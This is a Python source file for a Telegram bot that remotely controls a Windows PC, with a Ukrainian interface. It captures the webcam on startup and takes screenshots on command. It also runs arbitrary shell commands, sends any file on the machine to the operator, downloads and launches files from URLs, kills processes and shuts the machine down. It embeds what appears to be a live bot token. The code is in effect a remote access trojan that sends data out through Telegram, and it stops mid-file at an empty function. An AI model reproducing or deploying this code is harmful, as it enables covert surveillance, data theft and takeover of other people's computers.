import telebot
import os
import webbrowser
import requests
import platform
import ctypes
import mouse
import PIL.ImageGrab
import cv2
import time
from telebot import TeleBot
from PIL import Image, ImageGrab, ImageDraw
from pySmartDL import SmartDL
from telebot import types
from telebot import apihelper
from pynput.keyboard import Key, Controller


my_id = 381674729
bot_token = '8125378502:AAEXbmTNbpfDdd-wIuRX9_XKGJN4ixgyg4o'
bot = telebot.TeleBot(bot_token)

class User:
	def __init__(self):
		keys = ['urldown', 'fin', 'curs']

		for key in keys:
			self.key = None

User.curs = 50
keyboard = Controller()



##Клавіатура меню
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnscreen = types.KeyboardButton('📷Швидкий скріншот')
btnwebcam = types.KeyboardButton('📹Фото вебкамери')
btnmusic = types.KeyboardButton('♪ Управління музикою')
btnmouse = types.KeyboardButton('🖱Управління мишкою')
btnfiles = types.KeyboardButton('📂Файли та процеси')
btnaddit = types.KeyboardButton('❇️Додатково')
btnmsgbox = types.KeyboardButton('📩Надсилання повідомлення')
btninfo = types.KeyboardButton('❗️Інформація')
menu_keyboard.row(btnscreen, btnwebcam)
menu_keyboard.row(btnmouse, btnmusic)
menu_keyboard.row(btnfiles, btnaddit)
menu_keyboard.row(btninfo, btnmsgbox)

#Клавіатура музика
music_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnmpp = types.KeyboardButton('⏯️')
btnmback = types.KeyboardButton('⬅️')
btnmnext = types.KeyboardButton('➡️')
btnmvoldown = types.KeyboardButton('⬇️')
btnmvolup = types.KeyboardButton('⬆️')
btnmvolpro = types.KeyboardButton('Вибір гучності')
btnback = types.KeyboardButton('⏪Назад⏪')
music_keyboard.row(btnmpp)
music_keyboard.row(btnmback, btnmnext)
music_keyboard.row(btnmvoldown, btnmvolup)
music_keyboard.row(btnmvolpro, btnback)

#Клавіатура гучності
vol_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnvol1 = types.KeyboardButton('0%')
btnvol2 = types.KeyboardButton('10%')
btnvol3 = types.KeyboardButton('20%')
btnvol4 = types.KeyboardButton('30%')
btnvol5 = types.KeyboardButton('40%')
btnvol6 = types.KeyboardButton('50%')
btnvol7 = types.KeyboardButton('60%')
btnvol8 = types.KeyboardButton('70%')
btnvol9 = types.KeyboardButton('80%')
btnvol10 = types.KeyboardButton('90%')
btnvol11 = types.KeyboardButton('100%')
btnback = types.KeyboardButton('⏪Назад⏪')
vol_keyboard.row(btnvol1, btnvol2, btnvol3)
vol_keyboard.row(btnvol4, btnvol5, btnvol6)
vol_keyboard.row(btnvol7, btnvol8, btnvol9)
vol_keyboard.row(btnvol10, btnvol11, btnback)



#Клавіатура Файли та процеси
files_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnstart = types.KeyboardButton('✔️Запустити')
btnkill = types.KeyboardButton('❌Вимкнути процес')
btndown = types.KeyboardButton('⬇️Скачати файл')
btnupl = types.KeyboardButton('⬆️Завантажити файл')
btnurldown = types.KeyboardButton('🔗Завантажити за посиланням')
btnback = types.KeyboardButton('⏪Назад⏪')
files_keyboard.row(btnstart,  btnkill)
files_keyboard.row(btndown, btnupl)
files_keyboard.row(btnurldown, btnback)


#Клавиатура Додатково
additionals_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnweb = types.KeyboardButton('🔗Перейти за посиланням')
btncmd = types.KeyboardButton('✅Виконати команду')
btnoff = types.KeyboardButton("⛔️Вимкнути комп'ютер")
btnreb = types.KeyboardButton("♻️Перезавантажити комп'ютер")
btninfo = types.KeyboardButton("🖥Про комп'ютер")
btnlock = types.KeyboardButton("🔒Заблокувати комп'ютер")
btnback = types.KeyboardButton('⏪Назад⏪')
additionals_keyboard.row(btnoff, btnreb)
additionals_keyboard.row(btnlock, btnweb)
additionals_keyboard.row(btncmd, btninfo)
additionals_keyboard.row(btnback)


#Клавіатура миша
mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btnup = types.KeyboardButton('⬆️')
btndown = types.KeyboardButton('⬇️')
btnleft = types.KeyboardButton('⬅️')
btnright = types.KeyboardButton('➡️')
btnclick = types.KeyboardButton('🆗')
btnback = types.KeyboardButton('⏪Назад⏪')
btncurs = types.KeyboardButton('Вказати розмах курсору')
mouse_keyboard.row(btnup)
mouse_keyboard.row(btnleft, btnclick, btnright)
mouse_keyboard.row(btndown)
mouse_keyboard.row(btnback, btncurs)


info_msg = '''
*Про команди*
_📷Швидкий скріншот_ - відправляє скріншот екрану
_📹Фото вебкамери_ - надсилає фотографію з вебкамери
_🖱Управління мишкою_ - переходить у меню управління мишкою
_♪ Управління музикою_ - переходить у меню управління музикою та гучністю
_📂Файли та процеси_ - переходить у меню з управлінням файлів та процесів
_❇️Додатково_ - переходить у меню з дод. функціями
_📩Надсилання повідомлення_ - надішле на ПК вікно з повідомленням(msgbox)
_⏪Назад⏪_ - повертає до головного меню

_🔗Перейти за посиланням_ - переходить за вказаним посиланням (важливо вказати "http://" або "https://" для відкриття посилання в стандартному браузері, а не IE)
_✅Виконати команду_ - виконує в cmd будь-яку вказану команду
_⛔️Вимкнути комп'ютер_ - моментально вимикає комп'ютер
_♻️Перезавантажити комп'ютер_ - моментально перезавантажує комп'ютер
_🔒Заблокувати комп'ютер_ - блокує поточну сесію Windows
_🖥Про комп'ютер_ - показує ім'я користувача, ip, операційну систему та процесор

_❌Вимкнути процес_ - завершує будь-який процес
_✔️Запустити_ - відкриває будь-які файли (у тому числі і exe)
_⬇️Скачати файл_ - завантажує вказаний файл з вашого комп'ютера
_⬆️Скачати файл_ - завантажує файл на ваш комп'ютер
_🔗Завантажити за посиланням_ - завантажує файл на ваш комп'ютер за прямим посиланням
'''

MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
	pass
else:
	bot.send_message(my_id, "Доброго дня, цей бот призначений для віддаленого керування комп'ютером!\nСпочатку прочитайте все у меню \"❗️Інформація\"\n", parse_mode = "markdown")
	MessageBox(None, f"На ПК запущено програму Remote Control PC для керування комп'ютером\nЦе повідомлення є разовим", '!УВАГА!', 0)
	f = open('msg.pt', 'tw', encoding='utf-8')
	f.close

bot.send_message(my_id, "ПК запущений", reply_markup = menu_keyboard)

bot.send_chat_action(my_id, 'upload_photo')
try:
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite('webcam.png', frame)
    cap.release()
    bot.send_photo(my_id, open("webcam.png", "rb"))
    os.remove("webcam.png")
except Exception as e:
    bot.send_message(my_id, f"Комп'ютер заблоковано: {e}")

@bot.message_handler(content_types=["text"])
def get_text_messages(message):
    if message.from_user.id == my_id:
        if message.text == "📷Швидкий скріншот":
            start_time = time.time()  # Время начала
            bot.send_chat_action(my_id, 'upload_photo')
            try:
                get_screenshot()
                bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
                os.remove("screen.png")
                os.remove("screen_with_mouse.png")
            except Exception as e:
                bot.send_message(my_id, f"Комп'ютер заблоковано: {e}")
            end_time = time.time()  # Время окончания
            print(f"Время выполнения '📷Швидкий скріншот': {end_time - start_time:.2f} секунд")

        elif message.text == "📹Фото вебкамери":
            start_time = time.time()
            bot.send_chat_action(my_id, 'upload_photo')
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cv2.imwrite('webcam.png', frame)
                cap.release()
                bot.send_photo(my_id, open("webcam.png", "rb"))
                os.remove("webcam.png")
            except Exception as e:
                bot.send_message(my_id, f"Комп'ютер заблоковано: {e}")
            end_time = time.time()
            print(f"Время выполнения '📹Фото вебкамери': {end_time - start_time:.2f} секунд")

        elif message.text == "♪ Управління музикою":
            start_time = time.time()
            bot.send_message(my_id, "♪ Управління музикою", reply_markup=music_keyboard)
            bot.register_next_step_handler(message, music_process)
            end_time = time.time()
            print(f"Время выполнения '♪ Управління музикою': {end_time - start_time:.2f} секунд")

        elif message.text == "Вибір гучності":
            start_time = time.time()
            bot.send_message(my_id, "Вибір гучності", reply_markup=vol_keyboard)
            bot.register_next_step_handler(message, vol_process)
            end_time = time.time()
            print(f"Время выполнения 'Вибір гучності': {end_time - start_time:.2f} секунд")

        elif message.text == "🖱Управління мишкою":
            start_time = time.time()
            bot.send_message(my_id, "🖱Управління мишкою", reply_markup=mouse_keyboard)
            bot.register_next_step_handler(message, mouse_process)
            end_time = time.time()
            print(f"Время выполнения '🖱Управління мишкою': {end_time - start_time:.2f} секунд")

        elif message.text == "⏪Назад⏪":
            start_time = time.time()
            back(message)
            end_time = time.time()
            print(f"Время выполнения '⏪Назад⏪': {end_time - start_time:.2f} секунд")

        elif message.text == "📂Файли та процеси":
            start_time = time.time()
            bot.send_message(my_id, "📂Файли та процеси", reply_markup=files_keyboard)
            bot.register_next_step_handler(message, files_process)
            end_time = time.time()
            print(f"Время выполнения '📂Файли та процеси': {end_time - start_time:.2f} секунд")

        elif message.text == "❇️Додатково":
            start_time = time.time()
            bot.send_message(my_id, "❇️Додатково", reply_markup=additionals_keyboard)
            bot.register_next_step_handler(message, addons_process)
            end_time = time.time()
            print(f"Время выполнения '❇️Додатково': {end_time - start_time:.2f} секунд")

        elif message.text == "📩Надсилання повідомлення":
            start_time = time.time()
            bot.send_message(my_id, "Вкажіть текст повідомлення:")
            bot.register_next_step_handler(message, messaga_process)
            end_time = time.time()
            print(f"Время выполнения '📩Надсилання повідомлення': {end_time - start_time:.2f} секунд")

        elif message.text == "❗️Інформація":
            start_time = time.time()
            bot.send_message(my_id, info_msg, parse_mode="markdown")
            end_time = time.time()
            print(f"Время выполнения '❗️Інформація': {end_time - start_time:.2f} секунд")

        else:
            pass
    else:
        info_user(message)



def addons_process(message):
    if message.from_user.id == my_id:
        start_time = time.time()
        bot.send_chat_action(my_id, 'typing')
        
        if message.text == "🔗Перейти за посиланням":
            action_start_time = time.time() 
            bot.send_message(my_id, "Вкажіть посилання: ")
            bot.register_next_step_handler(message, web_process)
            action_end_time = time.time() 
            print(f"Время выполнения '🔗Перейти за посиланням': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "✅Виконати команду":
            action_start_time = time.time()
            bot.send_message(my_id, "Вкажіть консольну команду: ")
            bot.register_next_step_handler(message, cmd_process)
            action_end_time = time.time() 
            print(f"Время выполнения '✅Виконати команду': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "⛔️Вимкнути комп'ютер":
            action_start_time = time.time() 
            bot.send_message(my_id, "Вимкнення комп'ютера...")
            os.system('shutdown -s /t 0 /f')
            action_end_time = time.time() 
            print(f"Время выполнения '⛔️Вимкнути комп'ютер': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "♻️Перезавантажити комп'ютер":
            action_start_time = time.time()
            bot.send_message(my_id, "Перезавантаження комп'ютера...")
            os.system('shutdown -r /t 0 /f')
            action_end_time = time.time() 
            print(f"Время выполнения '♻️Перезавантажити комп'ютер': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "🔒Заблокувати комп'ютер":
            action_start_time = time.time()
            bot.send_message(my_id, "Блокування комп'ютера...")
            ctypes.windll.user32.LockWorkStation()
            action_end_time = time.time() 
            print(f"Время выполнения '🔒Заблокувати комп'ютер': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "🖥Про комп'ютер":
            action_start_time = time.time()
            req = requests.get('https://api.ipify.org')
            ip = req.text
            uname = os.getlogin()
            windows = platform.platform()
            processor = platform.processor()
            bot.send_message(my_id, f"*Користувач:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процесор:* {processor}", parse_mode = "markdown")
            action_end_time = time.time() 
            print(f"Время выполнения '🖥Про комп'ютер': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, addons_process)

        elif message.text == "⏪Назад⏪":
            action_start_time = time.time()
            back(message)
            action_end_time = time.time() 
            print(f"Время выполнения '⏪Назад⏪': {action_end_time - action_start_time:.2f} секунд")
        
        else:
            action_start_time = time.time()
            pass
            action_end_time = time.time() 
            print(f"Время выполнения 'default': {action_end_time - action_start_time:.2f} секунд")

        end_time = time.time()  
        print(f"Время выполнения 'addons_process': {end_time - start_time:.2f} секунд")
        
    else:
        info_user(message)


def files_process(message):
	if message.from_user.id == my_id:
		bot.send_chat_action(my_id, 'typing')
		if message.text == "❌Вимкнути процес":	
			bot.send_message(my_id, "Вкажіть назву процесу: ")
			bot.register_next_step_handler(message, kill_process)

		elif message.text == "✔️Запустити":
			bot.send_message(my_id, "Вкажіть шлях до файлу: ")
			bot.register_next_step_handler(message, start_process)

		elif message.text == "⬇️Скачати файл":
			bot.send_message(my_id, "Вкажіть шлях до файлу: ")
			bot.register_next_step_handler(message, downfile_process)

		elif message.text == "⬆️Завантажити файл":
			bot.send_message(my_id, "Надішліть необхідний файл")
			bot.register_next_step_handler(message, uploadfile_process)

		elif message.text == "🔗Завантажити за посиланням":
			bot.send_message(my_id, "Вкажіть пряме посилання завантаження:")
			bot.register_next_step_handler(message, uploadurl_process)

		elif message.text == "⏪Назад⏪":
			back(message)
		else:
			pass
	else:
		info_user(message)


def music_process(message):
    if message.from_user.id == my_id:
        start_time = time.time()  
        
        if message.text == "⬅️":
            action_start_time = time.time()
            keyboard.press(Key.media_previous)
            keyboard.release(Key.media_previous)
            bot.send_message(my_id, "Переключено на попередній трек", reply_markup=music_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения '⬅️ Переключено на попередній трек': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, music_process)

        elif message.text == "➡️":
            action_start_time = time.time()
            keyboard.press(Key.media_next)
            keyboard.release(Key.media_next)
            bot.send_message(my_id, "Переключено на наступний трек", reply_markup=music_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения '➡️ Переключено на наступний трек': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, music_process)

        elif message.text == "⬆️":
            action_start_time = time.time()
            keyboard.press(Key.media_volume_up)
            keyboard.release(Key.media_volume_up)
            bot.send_message(my_id, "Гучність збільшена", reply_markup=music_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения '⬆️ Гучність збільшена': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, music_process)

        elif message.text == "⬇️":
            action_start_time = time.time()
            keyboard.press(Key.media_volume_down)
            keyboard.release(Key.media_volume_down)
            bot.send_message(my_id, "Гучність зменшена", reply_markup=music_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения '⬇️ Гучність зменшена': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, music_process)

        elif message.text == "Вибір гучності":
            action_start_time = time.time()
            bot.send_message(my_id, "Виберіть рівень гучності", reply_markup=vol_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения 'Вибір гучності': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, vol_process)

        elif message.text == "⏪Назад⏪":
            action_start_time = time.time()
            back(message)
            action_end_time = time.time() 
            print(f"Время выполнения '⏪Назад⏪': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "⏯️":
            action_start_time = time.time()
            keyboard.press(Key.media_play_pause)
            keyboard.release(Key.media_play_pause)
            bot.send_message(my_id, "Трек поставлено на паузу/відтворюється", reply_markup=music_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения '⏯️ Трек поставлено на паузу/відтворюється': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, music_process)

        else:
            action_start_time = time.time()
            bot.send_message(my_id, "Команда не розпізнана", reply_markup=music_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения 'Команда не розпізнана': {action_end_time - action_start_time:.2f} секунд")
            bot.register_next_step_handler(message, music_process)
        
        end_time = time.time()
        print(f"Время выполнения 'music_process': {end_time - start_time:.2f} секунд")
        
    else:
        info_user(message)


def vol_process(message):
    if message.from_user.id == my_id:
        start_time = time.time()  

        try:
            if message.text.endswith("%"):
                action_start_time = time.time()
                volume_level = int(message.text.strip('%'))
                set_system_volume(volume_level)
                action_end_time = time.time() 
                print(f"Время выполнения 'set_system_volume({volume_level})': {action_end_time - action_start_time:.2f} секунд")
                
                bot.send_message(my_id, f"Гучність встановлена ​​на {volume_level}%", reply_markup=vol_keyboard)
                bot.register_next_step_handler(message, vol_process)

            elif message.text == "⏪Назад⏪":
                action_start_time = time.time()
                bot.send_message(my_id, "Ви повернулися до меню керування музикою", reply_markup=music_keyboard)
                action_end_time = time.time() 
                print(f"Время выполнения 'Назад': {action_end_time - action_start_time:.2f} секунд")
                
                bot.register_next_step_handler(message, music_process)

            else:
                action_start_time = time.time()
                bot.send_message(my_id, "Неправильний вибір. Виберіть рівень гучності із запропонованих опцій.", reply_markup=vol_keyboard)
                action_end_time = time.time() 
                print(f"Время выполнения 'Неправильний вибір': {action_end_time - action_start_time:.2f} секунд")
                
                bot.register_next_step_handler(message, vol_process)

        except ValueError:
            action_start_time = time.time()
            bot.send_message(my_id, "Помилка гучності. Вкажіть значення від 0 до 100.", reply_markup=vol_keyboard)
            action_end_time = time.time() 
            print(f"Время выполнения 'Помилка гучності': {action_end_time - action_start_time:.2f} секунд")
            
            bot.register_next_step_handler(message, vol_process)

        end_time = time.time()
        print(f"Время выполнения 'vol_process': {end_time - start_time:.2f} секунд")
        
    else:
        info_user(message)

def set_system_volume(level):
    """Встановлює гучність системи (від 0 до 100)"""
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    from comtypes import CLSCTX_ALL
    from ctypes import cast, POINTER, windll

    start_time = time.time()  

    # Инициализация COM
    windll.ole32.CoInitialize(None)

    try:
        action_start_time = time.time()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        # Уровень громкости задается от 0.0 до 1.0
        volume.SetMasterVolumeLevelScalar(level / 100.0, None)
        action_end_time = time.time() 
        print(f"Время выполнения 'volume.SetMasterVolumeLevelScalar': {action_end_time - action_start_time:.2f} секунд")

    finally:
        # Завершение COM
        windll.ole32.CoUninitialize()

    end_time = time.time()
    print(f"Время выполнения 'set_system_volume': {end_time - start_time:.2f} секунд")


def mouse_process(message):
    if message.from_user.id == my_id:
        start_time = time.time()  

        if message.text == "⬆️":
            action_start_time = time.time()
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX, currentMouseY - User.curs)
            screen_process(message)
            action_end_time = time.time() 
            print(f"Время выполнения '⬆️': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "⬇️":
            action_start_time = time.time()
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX, currentMouseY + User.curs)
            screen_process(message)
            action_end_time = time.time() 
            print(f"Время выполнения '⬇️': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "⬅️":
            action_start_time = time.time()
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX - User.curs, currentMouseY)
            screen_process(message)
            action_end_time = time.time() 
            print(f"Время выполнения '⬅️': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "➡️":
            action_start_time = time.time()
            currentMouseX, currentMouseY = mouse.get_position()
            mouse.move(currentMouseX + User.curs, currentMouseY)
            screen_process(message)
            action_end_time = time.time() 
            print(f"Время выполнения '➡️': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "🆗":
            action_start_time = time.time()
            mouse.click()
            screen_process(message)
            action_end_time = time.time() 
            print(f"Время выполнения '🆗': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "Вказати розмах курсору":
            action_start_time = time.time()
            bot.send_chat_action(my_id, 'typing')
            bot.send_message(my_id, f"Вкажіть розмах, на даний момент розмах {str(User.curs)}px", reply_markup=mouse_keyboard)
            bot.register_next_step_handler(message, mousecurs_settings)
            action_end_time = time.time() 
            print(f"Время выполнения 'Вказати розмах курсору': {action_end_time - action_start_time:.2f} секунд")

        elif message.text == "⏪Назад⏪":
            action_start_time = time.time()
            back(message)
            action_end_time = time.time() 
            print(f"Время выполнения 'Назад': {action_end_time - action_start_time:.2f} секунд")

        else:
            pass

        end_time = time.time()
        print(f"Время выполнения 'mouse_process': {end_time - start_time:.2f} секунд")

    else:
        info_user(message)


def back(message):
    start_time = time.time()  
    bot.register_next_step_handler(message, get_text_messages)
    bot.send_message(my_id, "Ви у головному меню", reply_markup=menu_keyboard)
    end_time = time.time()
    print(f"Время выполнения 'back': {end_time - start_time:.2f} секунд")


def info_user(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    alert = f"Хтось намагався відправити команду: \"{message.text}\"\n\n"
    alert += f"user id: {str(message.from_user.id)}\n"
    alert += f"first name: {str(message.from_user.first_name)}\n"
    alert += f"last name: {str(message.from_user.last_name)}\n"
    alert += f"username: @{str(message.from_user.username)}"
    bot.send_message(my_id, alert, reply_markup=menu_keyboard)
    end_time = time.time()
    print(f"Время выполнения 'info_user': {end_time - start_time:.2f} секунд")

def kill_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        os.system("taskkill /IM " + message.text + ".exe -F")
        action_end_time = time.time() 
        bot.send_message(my_id, f"Процес \"{message.text}\" вимкнений", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
        print(f"Время выполнения 'kill_process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка! Процес не знайдено", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
        print(f"Время выполнения 'kill_process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'kill_process': {end_time - start_time:.2f} секунд")

def start_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        os.startfile(r'' + message.text)
        action_end_time = time.time() 
        bot.send_message(my_id, f"Файл по дорозі \"{message.text}\" запустився", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
        print(f"Время выполнения 'start_process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка! Вказано неправильний файл", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
        print(f"Время выполнения 'start_process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'start_process': {end_time - start_time:.2f} секунд")

def web_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        webbrowser.open(message.text, new=0)
        action_end_time = time.time() 
        bot.send_message(my_id, f"Перехід за посиланням \"{message.text}\" здійснений", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
        print(f"Время выполнения 'web_process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка! посилання введено неправильно", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
        print(f"Время выполнения 'web_process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'web_process': {end_time - start_time:.2f} секунд")

def cmd_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        os.system(message.text)
        action_end_time = time.time() 
        bot.send_message(my_id, f"Команда \"{message.text}\" виконана", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
        print(f"Время выполнения 'cmd_process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка! Невідома команда", reply_markup=additionals_keyboard)
        bot.register_next_step_handler(message, addons_process)
        print(f"Время выполнения 'cmd_process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'cmd_process': {end_time - start_time:.2f} секунд")

def say_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    bot.send_message(my_id, "У розробці...", reply_markup=menu_keyboard)
    end_time = time.time()
    print(f"Время выполнения 'say_process': {end_time - start_time:.2f} секунд")

def downfile_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        file_path = message.text
        if os.path.exists(file_path):
            bot.send_message(my_id, "Файл завантажується, зачекайте...")
            bot.send_chat_action(my_id, 'upload_document')
            file_doc = open(file_path, 'rb')
            bot.send_document(my_id, file_doc)
            bot.register_next_step_handler(message, files_process)
            action_end_time = time.time() 
            print(f"Время выполнения 'downfile_process': {action_end_time - action_start_time:.2f} секунд")
        else:
            action_end_time = time.time() 
            bot.send_message(my_id, "Файл не знайдено або вказано неправильний шлях (ПР.: C:\\Documents\\File.doc)")
            bot.register_next_step_handler(message, files_process)
            print(f"Время выполнения 'downfile_process' с ошибкой: {action_end_time - start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка! Файл не знайдено або вказано неправильний шлях (ПР.: C:\\Documents\\File.doc)")
        bot.register_next_step_handler(message, files_process)
        print(f"Время выполнения 'downfile_process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'downfile_process': {end_time - start_time:.2f} секунд")

def uploadfile_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(my_id, "Файл успішно завантажено")
        bot.register_next_step_handler(message, files_process)
        action_end_time = time.time() 
        print(f"Время выполнения 'uploadfile_process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка! Надішліть файл як документ")
        bot.register_next_step_handler(message, files_process)
        print(f"Время выполнения 'uploadfile_process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'uploadfile_process': {end_time - start_time:.2f} секунд")

def uploadurl_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    User.urldown = message.text
    bot.send_message(my_id, "Вкажіть шлях збереження файлу:")
    bot.register_next_step_handler(message, uploadurl_2process)
    end_time = time.time()
    print(f"Время выполнения 'uploadurl_process': {end_time - start_time:.2f} секунд")

def uploadurl_2process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        User.fin = message.text
        obj = SmartDL(User.urldown, User.fin, progress_bar=False)
        obj.start()
        action_end_time = time.time() 
        bot.send_message(my_id, f"Файл успішно збережений на шляху \"{User.fin}\"")
        bot.register_next_step_handler(message, files_process)
        print(f"Время выполнения 'uploadurl_2process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Вказано неправильне посилання або шлях")
        bot.register_next_step_handler(message, addons_process)
        print(f"Время выполнения 'uploadurl_2process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'uploadurl_2process': {end_time - start_time:.2f} секунд")

def messaga_process(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        MessageBox(None, message.text, 'PC TOOL', 0)
        action_end_time = time.time() 
        bot.send_message(my_id, f"Повідомлення з текстом \"{message.text}\" було закрито")
        print(f"Время выполнения 'messaga_process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка")
        print(f"Время выполнения 'messaga_process' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'messaga_process': {end_time - start_time:.2f} секунд")

def mousecurs_settings(message):
    start_time = time.time()  
    bot.send_chat_action(my_id, 'typing')
    try:
        action_start_time = time.time()
        if is_digit(message.text) == True:
            User.curs = int(message.text)
            bot.send_message(my_id, f"Розмах курсору змінено на {str(User.curs)}px", reply_markup = mouse_keyboard)
            bot.register_next_step_handler(message, mouse_process)
        else:
            bot.send_message(my_id, "Введіть ціле число: ", reply_markup = mouse_keyboard)
            bot.register_next_step_handler(message, mousecurs_settings)
        action_end_time = time.time() 
        print(f"Время выполнения 'mousecurs_settings': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_message(my_id, "Помилка! Неправильне значення.", reply_markup = mouse_keyboard)
        bot.register_next_step_handler(message, mousecurs_settings)
        print(f"Время выполнения 'mousecurs_settings' с ошибкой: {action_end_time - start_time:.2f} секунд")

    end_time = time.time()
    print(f"Общее время выполнения 'mousecurs_settings': {end_time - start_time:.2f} секунд")

def screen_process(message):
    start_time = time.time()  
    try:
        action_start_time = time.time()
        get_screenshot()
        bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
        bot.register_next_step_handler(message, mouse_process)
        os.remove("screen.png")
        os.remove("screen_with_mouse.png")
        action_end_time = time.time() 
        print(f"Время выполнения 'screen_process': {action_end_time - action_start_time:.2f} секунд")
    except Exception as e:
        action_end_time = time.time()
        bot.send_chat_action(my_id, 'typing')
        bot.send_message(my_id, "Комп'ютер заблоковано")
        bot.register_next_step_handler(message, mouse_process)
        print(f"Время выполнения 'screen_process' с ошибкой: {action_end_time - start_time:.2f} секунд")
    
    end_time = time.time()
    print(f"Общее время выполнения 'screen_process': {end_time - start_time:.2f} секунд")

def get_screenshot():
